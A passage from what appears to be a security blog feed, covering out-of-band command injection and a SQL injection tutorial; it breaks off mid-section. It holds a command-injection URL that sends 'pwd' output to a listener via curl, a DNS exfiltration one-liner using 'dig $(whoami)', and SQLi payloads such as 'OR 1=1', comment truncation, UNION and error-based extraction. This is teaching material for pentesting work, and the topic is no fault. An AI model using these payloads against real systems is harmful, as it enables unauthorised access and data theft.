      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(pwd)
</code></pre>
</div>

<p><strong>Watch the console</strong> if the app executes our command, it will leak the output (<code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">pwd</code>, etc.) into the URL path and hit our trap server.</p>

<hr />

<h3 id="step-3-confirm-execution">Step 3: Confirm Execution</h3>

<p>Your listener should output something like:</p>

<p><code class="language-plaintext highlighter-rouge">[+] Caught request from 10.0.2.12 | PATH: /root</code></p>

<p>That means your payload got executed, the app reached out to your server, and it returned the result of <code class="language-plaintext highlighter-rouge">$(whoami)</code> or <code class="language-plaintext highlighter-rouge">$(pwd)</code>.</p>

<p><strong>command execution confirmed via OOB</strong>.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OyWoFZy4uaRWq_sMjEghNw.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<hr />

<h3 id="why-this-works">Why This Works</h3>

<p>Most apps don’t restrict outbound traffic. So if you can’t see the result on the frontend, you make the backend deliver the result to your own server. It’s like putting a mic on the enemy comms.</p>

<hr />

<h3 id="pro-tips">Pro Tips</h3>

<ul>
  <li>
    <p>Use tools like <strong>Burp Collaborator</strong>, <strong>RequestBin</strong>, or your own <strong>DNS/HTTP listener</strong>.</p>
  </li>
  <li>
    <p>Want stealth? Use DNS-based callbacks: <code class="language-plaintext highlighter-rouge">dig $(whoami).yourdomain.com</code></p>
  </li>
  <li>
    <p>OOB is king when you’re behind WAFs, filtered output, or sandboxed environments.</p>
  </li>
</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SQL Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI.html" rel="alternate" type="text/html" title="SQL Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_evil_computer_hackers_degen_dark_det_in_the_style_of_cr_6984d0d8-875c-4a2e-83b9-d3b30ff721f1.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>

<h1 id="sql-structured-query-language">SQL (Structured Query Language)</h1>
<hr />

<p>SQL is a powerful language used to interact with relational databases. It lets you fetch, update, insert, and remove data using clear commands called <strong>statements</strong>.</p>

<p>In this guide, we’ll stick with <strong>MySQL-style syntax</strong>. It’s important to know SQL is <strong>not case-sensitive</strong>, so commands like <code class="language-plaintext highlighter-rouge">SELECT</code>, <code class="language-plaintext highlighter-rouge">select</code>, and <code class="language-plaintext highlighter-rouge">SeLeCt</code> all behave the same.</p>

<hr />

<h2 id="select--retrieving-data"><strong>SELECT – Retrieving Data</strong></h2>

<p>Let’s say we have a table named <code class="language-plaintext highlighter-rouge">books</code>.</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select * from books;
</code></pre>
</div>

<p>This pulls all columns and rows from the <code class="language-plaintext highlighter-rouge">books</code> table.</p>

<h3 id="sample-output">Sample Output:</h3>

<table>
  <thead>
    <tr>
      <th>id</th>
      <th>title</th>
      <th>author</th>
      <th>genre</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>Cyber Shadows</td>
      <td>Max Hollow</td>
      <td>Thriller</td>
    </tr>
    <tr>
      <td>2</td>
      <td>Datafall</td>
      <td>Mira Grant</td>
      <td>Sci-Fi</td>
    </tr>
    <tr>
      <td>3</td>
      <td>Broken Protocol</td>
      <td>L. Pierce</td>
      <td>Mystery</td>
    </tr>
  </tbody>
</table>

<hr />

<p>To return only certain columns:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select title, author from books;
</code></pre>
</div>

<h3 id="output">Output:</h3>

<table>
  <thead>
    <tr>
      <th>title</th>
      <th>author</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Cyber Shadows</td>
      <td>Max Hollow</td>
    </tr>
    <tr>
      <td>Datafall</td>
      <td>Mira Grant</td>
    </tr>
    <tr>
      <td>Broken Protocol</td>
      <td>L. Pierce</td>
    </tr>
  </tbody>
</table>

<hr />

<h2 id="limit--restricting-results"><strong>LIMIT – Restricting Results</strong></h2>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select * from books limit 2;
</code></pre>
</div>

<p>Returns the first <strong>2 rows</strong> from the table.</p>

<p>To skip rows:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select * from books limit 1,2;
</code></pre>
</div>

<p>This skips the first row and returns the next two.</p>

<hr />

<h2 id="where---filtering-data"><strong>WHERE - Filtering Data</strong></h2>

<p>Use <code class="language-plaintext highlighter-rouge">WHERE</code> to fetch rows based on conditions:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select * from books where genre = 'Thriller';
</code></pre>
</div>

<h3 id="output-1">Output:</h3>

<table>
  <thead>
    <tr>
      <th>id</th>
      <th>title</th>
      <th>author</th>
      <th>genre</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>Cyber Shadows</td>
      <td>Max Hollow</td>
      <td>Thriller</td>
    </tr>
  </tbody>
</table>

<p>Use <code class="language-plaintext highlighter-rouge">!=</code> to exclude:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select * from books where genre != 'Thriller';
</code></pre>
</div>

<p>Use <code class="language-plaintext highlighter-rouge">OR</code> and <code class="language-plaintext highlighter-rouge">AND</code> to stack conditions:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select * from books where genre = 'Sci-Fi' or genre = 'Mystery';
</code></pre>
</div>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select * from books where author = 'Mira Grant' and genre = 'Sci-Fi';
</code></pre>
</div>

<hr />

<h2 id="like--pattern-matching"><strong>LIKE – Pattern Matching</strong></h2>

<p>Use <code class="language-plaintext highlighter-rouge">LIKE</code> with <code class="language-plaintext highlighter-rouge">%</code> as a wildcard.</p>

<p><strong>Starts with</strong>:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select * from books where author like 'M%';
</code></pre>
</div>

<p>Returns rows where the author starts with “M”.</p>

<p><strong>Ends with</strong>:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select * from books where title like '%l';
</code></pre>
</div>

<p><strong>Contains</strong>:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select * from books where title like '%ro%';
</code></pre>
</div>

<hr />

<h2 id="union--merging-results-from-multiple-tables"><strong>UNION – Merging Results from Multiple Tables</strong></h2>

<p>Say we have a <code class="language-plaintext highlighter-rouge">books</code> table and a <code class="language-plaintext highlighter-rouge">magazines</code> table:</p>

<h3 id="books-table"><code class="language-plaintext highlighter-rouge">books</code> Table:</h3>

<table>
  <thead>
    <tr>
      <th>title</th>
      <th>author</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Cyber Shadows</td>
      <td>Max Hollow</td>
    </tr>
    <tr>
      <td>Datafall</td>
      <td>Mira Grant</td>
    </tr>
  </tbody>
</table>

<h3 id="magazines-table"><code class="language-plaintext highlighter-rouge">magazines</code> Table:</h3>

<table>
  <thead>
    <tr>
      <th>title</th>
      <th>editor</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>HackWorld Monthly</td>
      <td>Erin Voss</td>
    </tr>
    <tr>
      <td>Tech Digest</td>
      <td>Dan Irvine</td>
    </tr>
  </tbody>
</table>

<p>Combine both into one list:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
select title, author from books union select title, editor from magazines;
</code></pre>
</div>

<hr />

<h2 id="insert--adding-data"><strong>INSERT – Adding Data</strong></h2>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
insert into books (title, author, genre) values ('Echoes of Null', 'J. Drayke', 'Cyberpunk');
</code></pre>
</div>

<p>Now <code class="language-plaintext highlighter-rouge">books</code> has a new row:</p>

<table>
  <thead>
    <tr>
      <th>id</th>
      <th>title</th>
      <th>author</th>
      <th>genre</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>4</td>
      <td>Echoes of Null</td>
      <td>J. Drayke</td>
      <td>Cyberpunk</td>
    </tr>
  </tbody>
</table>

<hr />

<h2 id="update--modifying-data"><strong>UPDATE – Modifying Data</strong></h2>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
update books set genre = 'Tech Noir' where title = 'Echoes of Null';
</code></pre>
</div>

<p>Changes the genre of one specific book.</p>

<hr />

<h2 id="delete--removing-data"><strong>DELETE – Removing Data</strong></h2>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
delete from books where author = 'Max Hollow';
</code></pre>
</div>

<p>Deletes all books by Max Hollow.</p>

<p>Or wipe the table:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
delete from books;
</code></pre>
</div>

<p>All rows gone but the table still exists.</p>

<h1 id="what-is-sql-injection-sqli">What is SQL Injection (SQLi)?</h1>
<hr />

<p><strong>SQL Injection (SQLi)</strong> is a vulnerability that occurs when an application takes <strong>user input</strong> and drops it directly into an <strong>SQL query</strong> without proper validation or sanitization. This opens the door for attackers to <strong>manipulate the query</strong> and extract, bypass, or destroy data.</p>

<p>It’s like handing your database a loaded gun… and letting the user pull the trigger.</p>

<hr />

<h2 id="real-world-example--the-blog-post-trap">Real-World Example – The Blog Post Trap</h2>

<p>Let’s imagine a blog site where each post has a unique ID. Posts may be <em>public</em> (ready to read) or <em>private</em> (still in draft).</p>

<p>A standard blog post URL might look like this:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
https://cyberjournal.io/post?id=4
</code></pre>
</div>

<p>Under the hood, the backend may run an SQL query like this:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
SELECT * FROM posts WHERE id=4 AND is_public=1 LIMIT 1;
</code></pre>
</div>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">id=4</code> — tells the database which post to fetch.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">is_public=1</code> — filters out private drafts.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">LIMIT 1</code> — ensures only one row is returned.</p>
  </li>
</ul>

<p>If <code class="language-plaintext highlighter-rouge">post 4</code> is public, you see it. If it’s private (<code class="language-plaintext highlighter-rouge">is_public=0</code>), you get a “not found” page.</p>

<hr />

<h2 id="where-it-breaks-injecting-malicious-input">Where It Breaks Injecting Malicious Input</h2>

<p>Here’s the catch: if the <strong><code class="language-plaintext highlighter-rouge">id</code></strong> parameter is used directly in the query without filtering it’s open to abuse.</p>

<p>Let’s say <code class="language-plaintext highlighter-rouge">post 7</code> is a private draft.</p>

<p>You try this URL:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
https://cyberjournal.io/post?id=7
</code></pre>
</div>

<p>You get nothing, as expected.</p>

<p>But what if you sneak in this instead?</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
https://cyberjournal.io/post?id=7 OR 1=1
</code></pre>
</div>

<p>Now the SQL query becomes:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
SELECT * FROM posts WHERE id=7 OR 1=1 AND is_public=1 LIMIT 1;
</code></pre>
</div>

<p>Due to logical operator precedence, <code class="language-plaintext highlighter-rouge">1=1</code> evaluates as true bypassing the intent of the filter. But more dangerously, some devs might write queries like this:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
SELECT * FROM posts WHERE id=$id;
</code></pre>
</div>

<p>And now, you pass:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
https://cyberjournal.io/post?id=7;--
</code></pre>
</div>

<p>That transforms the SQL into:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
SELECT * FROM posts WHERE id=7;--
</code></pre>
</div>

<p><code class="language-plaintext highlighter-rouge">--</code> is the SQL comment syntax. It disables anything after it. So if the app tried to append <code class="language-plaintext highlighter-rouge">AND is_public=1</code>, it gets ignored.</p>

<p>You now view a private post.</p>

<hr />

<h2 id="️-why-this-happens">⚙️ Why This Happens</h2>

<p>It all boils down to <strong>trusting user input</strong>. SQL engines don’t care where the data comes from they just execute the final string. If the app doesn’t escape or bind inputs safely, attackers write their own logic inside your query.</p>

<h1 id="in-band-sql-injection-one-path-in-one-path-out">In-Band SQL Injection: One Path In. One Path Out.</h1>
<hr />

<p><strong>In-Band SQLi</strong> is the <em>loudest</em>, <em>simplest</em>, and <em>most direct</em> form of SQL Injection. It’s called “In-Band” because:</p>

<blockquote>
  <p>The <strong>request</strong> and <strong>response</strong> both travel the <strong>same channel</strong> usually the web browser.</p>
</blockquote>

<p>You shoot the payload ➜ the app executes it ➜ the results spill out right on the page.</p>

<p>It’s fast. It’s obvious. And if it works, you’re basically jacked into the DB like it’s 1999.</p>

<hr />

<h3 id="use-case-comment-viewer">Use Case: Comment Viewer</h3>

<p>Imagine a basic URL:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
https://comments.sys/view.php?cid=10
</code></pre>
</div>

<p>The backend query might look like:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
SELECT name, message FROM comments WHERE cid=10;
</code></pre>
</div>

<p>Nothing fancy. But if the input isn’t sanitized, try this:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
https://comments.sys/view.php?cid=10 UNION SELECT user(), database();
</code></pre>
</div>

<p>Page now shows:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
Name: root@localhost
Message: blogdb
</code></pre>
</div>

<p>No authentication. No session. Just raw data harvested through the same request channel.</p>

<hr />

<h2 id="subtypes-of-in-band-sqli">Subtypes of In-Band SQLi</h2>

<h4 id="1-error-based-sql-injection">1. Error-Based SQL Injection</h4>

<p>This one rides on the <strong>error output</strong> from the database itself. If the backend is verbose (MySQL, MSSQL, PostgreSQL, etc.), you can throw crafted payloads and get the <strong>structure of the database dumped back at you</strong>.</p>

<p><strong>Example:</strong></p>

<p>Original URL:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
https://comments.sys/view.php?cid=10
</code></pre>
</div>

<p>Try this:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
https://comments.sys/view.php?cid=10 AND 1=CONVERT(int,(SELECT @@version));
</code></pre>
</div>

<p>If error messages are on, you get:</p>

<div class="alert-error">
Error: Conversion failed when converting the varchar value 'Microsoft SQL Server 2019' to data type int.
</div>

<p>You now know the DB engine and version.</p>

<p>Keep chaining errors and use the messages to:</p>

<ul>
  <li>
    <p>Discover table names</p>
  </li>
  <li>
    <p>Leak column names</p>
  </li>
  <li>
    <p>Reveal datatypes</p>
  </li>
  <li>
    <p>Map the entire schema</p>
  </li>
</ul>

<blockquote>
  <p><strong>Pro tip:</strong> Use <code class="language-plaintext highlighter-rouge">GROUP BY</code>, <code class="language-plaintext highlighter-rouge">ORDER BY</code>, or broken <code class="language-plaintext highlighter-rouge">CAST()</code>/<code class="language-plaintext highlighter-rouge">CONVERT()</code> to squeeze out leaks.</p>
</blockquote>

<hr />

<h3 id="2-union-based-sql-injection">2. UNION-Based SQL Injection</h3>

<p>This is your primary data extraction tool. You piggyback off a legit <code class="language-plaintext highlighter-rouge">SELECT</code> and bolt your own query onto it using the <strong><code class="language-plaintext highlighter-rouge">UNION</code></strong> keyword.</p>

<p>But here’s the catch:</p>

<ul>
  <li>
    <p>You must match the <strong>column count</strong> of the original query.</p>
  </li>
  <li>
    <p>The <strong>data types</strong> must align.</p>
  </li>
</ul>

<p>Let’s walk it.</p>

<p>Original vulnerable query:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
